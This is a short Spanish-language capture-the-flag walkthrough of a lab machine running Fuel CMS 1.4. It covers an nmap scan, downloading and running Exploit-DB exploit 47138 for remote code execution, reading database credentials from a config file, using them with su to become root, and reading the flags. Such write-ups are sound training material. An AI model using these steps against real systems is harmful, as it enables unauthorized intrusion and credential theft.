### **1. Escaneo inicial**

- Se ejecuta nmap -sV 10.10.200.75
    
- **Puerto 80 (HTTP)**: Servicio Apache con **Fuel CMS 1.4**
    

---

### **2. Reconocimiento web**

- Se visita http://10.10.200.75 en el navegador.
    
- En el código fuente se confirma **Fuel CMS 1.4**.
    
- Se busca en Google: _"Fuel CMS 1.4 exploit"_ → Encuentra **RCE (Ejecución Remota de Código)**.
    

---

### **3. Explotación**

- Se descarga el exploit de Exploit-DB:
    
    bash
    
    Copy
    
    searchsploit -m 47138 && mv 47138.py fuel_rce.py
    
- Se ejecuta:
    
    bash
    
    Copy
    
    python3 fuel_rce.py http://10.10.200.75
    
- **Resultado**: Obtiene shell como **www-data**.
    

---

### **4. Escalada de privilegios**

- Se buscan credenciales en archivos de configuración:
    
    bash
    
    Copy
    
    cat /var/www/html/fuel/application/config/database.php
    
- **Credenciales encontradas**:
    
    php
    
    Copy
    
    'username' => 'root',
    'password' => 'mememe',
    
- Se prueba en el sistema:
    
    bash
    
    Copy
    
    su root  
    Password: mememe 
    

---

### **5. Flags capturadas**

- **User flag**:
    
    bash
    
    Copy
    
    cat /home/www-data/user.txt
    
   
    
- **Root flag**:
    
    bash
    
    Copy
    
    cat /root/root.txt
    
